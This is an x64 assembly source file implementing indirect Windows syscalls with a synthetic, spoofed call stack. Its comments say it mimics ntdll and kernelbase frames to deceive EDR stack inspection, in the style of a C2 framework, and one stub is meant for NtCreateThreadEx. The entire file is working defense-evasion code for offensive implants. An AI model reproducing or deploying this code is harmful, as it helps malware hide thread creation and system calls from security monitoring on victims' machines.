# ============================================================================
# dosyscall.S - Indirect Syscall Stubs (GCC/MinGW x64)
#
# DoSyscallSpoof   - 6 NT args + 3-frame synthetic stack (KhaosC2 style)
# DoSyscallSpoof11 - 11 NT args + 3-frame synthetic stack
#
# ── Synthetic stack at `syscall` instruction ─────────────────────────────────
#
#  [RSP+0x00] = DesyncCallSite  ntdll addr s.t. [addr-5]==0xE8 AND bytes=[add rsp,0x10;ret]
#               EDR frame 0: looks like ntdll return from CALL ✓
#               Actual exec:  add rsp,0x10 ; ret  → lands on cleanup (skips frames 1-2)
#
#  [RSP+0x08] = NtCallSite      ntdll addr s.t. [addr-5]==0xE8  (fake frame, never reached)
#               EDR frame 1: ntdll ✓
#
#  [RSP+0x10] = KbCallSite      kernelbase addr s.t. [addr-5]==0xE8 (fake frame, never reached)
#               EDR frame 2: kernelbase ✓
#
#  [RSP+0x18] = cleanup         our .exe return label
#               EDR frame 3: .exe — 4 levels deep, usually not inspected
#               DesyncCallSite: add rsp,0x10 ; ret → RSP=+0x08+0x10=+0x18 → ret → cleanup ✓
#
#  [RSP+0x20] = 0 (padding)
#  [RSP+0x28] = NT arg5  ← required by kernel for 5th NT param
#  [RSP+0x30] = NT arg6
#
# DoSyscallSpoof params (Windows x64 calling convention):
#   RCX = ssn
#   RDX = SyscallGadget  (syscall;ret inside loaded ntdll — image-backed)
#   R8  = fakeRet1/DesyncCallSite
#   R9  = fakeRet2/NtCallSite
#   [RSP+0x28] = fakeRet3/KbCallSite
#   [RSP+0x30] = NT arg1 ... [RSP+0x58] = NT arg6
# ============================================================================

.text

# ── DoSyscallSpoof: 3-frame synthetic stack + image-backed gadget ────────────
#
# Register saves (6 pushes = 0x30 shift from entry RSP):
#   rbx=gadget  rsi=ssn  rdi=<free>  r12=fakeRet1  r13=fakeRet2  r14=cleanup
#   r11 used as volatile temp for fakeRet3 (r11 is caller-saved — no save needed)
#
# Entry stack (after CALL pushed retaddr):
#   [RSP+0x28]=fakeRet3  [RSP+0x30]=arg1 ... [RSP+0x58]=arg6
# After 6 pushes (shift 0x30):
#   [RSP+0x58]=fakeRet3  [RSP+0x60]=arg1 ... [RSP+0x88]=arg6
# After subq 0x38 (total shift 0x68):
#   arg5 @ [RSP+0xB8]   arg6 @ [RSP+0xC0]
#
# Alignment: entry RSP=16n-8 → +6 pushes → 16m-8 → -0x38 → 16k+0 (aligned ✓)
# ────────────────────────────────────────────────────────────────────────────
.globl DoSyscallSpoof
.def DoSyscallSpoof; .scl 2; .type 32; .endef

DoSyscallSpoof:
    pushq %rbx
    pushq %rsi
    pushq %rdi
    pushq %r12
    pushq %r13
    pushq %r14

    movq %rdx, %rbx            # gadget (syscall;ret in image-backed ntdll)
    movl %ecx, %esi            # SSN
    movq %r8,  %r12            # fakeRet1 / DesyncCallSite
    movq %r9,  %r13            # fakeRet2 / NtCallSite

    movq 0x58(%rsp), %r11      # r11 = fakeRet3 / KbCallSite  (volatile, safe)
    movq 0x60(%rsp), %r10      # R10 = NT arg1
    movq 0x68(%rsp), %rdx      # RDX = NT arg2
    movq 0x70(%rsp), %r8       # R8  = NT arg3
    movq 0x78(%rsp), %r9       # R9  = NT arg4

    lea  DoSyscallSpoof_cleanup(%rip), %r14

    subq $0x38, %rsp            # allocate syscall frame (16-byte aligned at jmp)

    movq %r12, 0x00(%rsp)       # [RSP+0x00] DesyncCallSite  → EDR frame 0: ntdll ✓
    movq %r13, 0x08(%rsp)       # [RSP+0x08] NtCallSite      → EDR frame 1: ntdll ✓
    movq %r11, 0x10(%rsp)       # [RSP+0x10] KbCallSite      → EDR frame 2: kernelbase ✓
    movq %r14, 0x18(%rsp)       # [RSP+0x18] cleanup         → EDR frame 3: .exe
    movq $0,   0x20(%rsp)       # padding

    movq 0xB8(%rsp), %rax; movq %rax, 0x28(%rsp)   # NT arg5
    movq 0xC0(%rsp), %rax; movq %rax, 0x30(%rsp)   # NT arg6

    movl %esi, %eax
    jmp  *%rbx                  # JMP not CALL — no retaddr pushed, RSP unchanged

DoSyscallSpoof_cleanup:
    # RAX = NTSTATUS from kernel
    # Return chain: desync(add rsp,0x10;ret) → skips NtCallSite+KbCallSite → lands here
    addq $0x38, %rsp
    popq %r14
    popq %r13
    popq %r12
    popq %rdi
    popq %rsi
    popq %rbx
    ret

# ── DoSyscallSpoof11: 3-frame spoof + 11 NT args (NtCreateThreadEx) ─────────
#
# Entry:  RCX=ssn  RDX=gadget  R8=fakeRet1  R9=fakeRet2
#         [RSP+0x28]=fakeRet3
#         [RSP+0x30]=arg1 ... [RSP+0x80]=arg11
# After 6 pushes (shift 0x30):
#         [RSP+0x58]=fakeRet3
#         [RSP+0x60]=arg1 ... [RSP+0xB0]=arg11
# After subq 0x60 (total shift 0x90):
#         arg5 @ [RSP+0xE0] ... arg11 @ [RSP+0x110]
# ────────────────────────────────────────────────────────────────────────────
.globl DoSyscallSpoof11
.def DoSyscallSpoof11; .scl 2; .type 32; .endef

DoSyscallSpoof11:
    pushq %rbx
    pushq %rsi
    pushq %rdi
    pushq %r12
    pushq %r13
    pushq %r14

    movq %rdx, %rbx
    movl %ecx, %esi
    movq %r8,  %r12            # fakeRet1
    movq %r9,  %r13            # fakeRet2

    movq 0x58(%rsp), %r11      # r11 = fakeRet3 (volatile)
    movq 0x60(%rsp), %r10      # R10 = NT arg1
    movq 0x68(%rsp), %rdx      # RDX = NT arg2
    movq 0x70(%rsp), %r8       # R8  = NT arg3
    movq 0x78(%rsp), %r9       # R9  = NT arg4

    lea  DoSyscallSpoof11_cleanup(%rip), %r14

    subq $0x60, %rsp

    movq %r12, 0x00(%rsp)
    movq %r13, 0x08(%rsp)
    movq %r11, 0x10(%rsp)      # fakeRet3
    movq %r14, 0x18(%rsp)      # cleanup
    movq $0,   0x20(%rsp)

    movq 0xE0(%rsp),  %rax; movq %rax, 0x28(%rsp)   # NT arg5
    movq 0xE8(%rsp),  %rax; movq %rax, 0x30(%rsp)   # NT arg6
    movq 0xF0(%rsp),  %rax; movq %rax, 0x38(%rsp)   # NT arg7
    movq 0xF8(%rsp),  %rax; movq %rax, 0x40(%rsp)   # NT arg8
    movq 0x100(%rsp), %rax; movq %rax, 0x48(%rsp)   # NT arg9
    movq 0x108(%rsp), %rax; movq %rax, 0x50(%rsp)   # NT arg10
    movq 0x110(%rsp), %rax; movq %rax, 0x58(%rsp)   # NT arg11

    movl %esi, %eax
    jmp  *%rbx

DoSyscallSpoof11_cleanup:
    addq $0x60, %rsp
    popq %r14
    popq %r13
    popq %r12
    popq %rdi
    popq %rsi
    popq %rbx
    ret
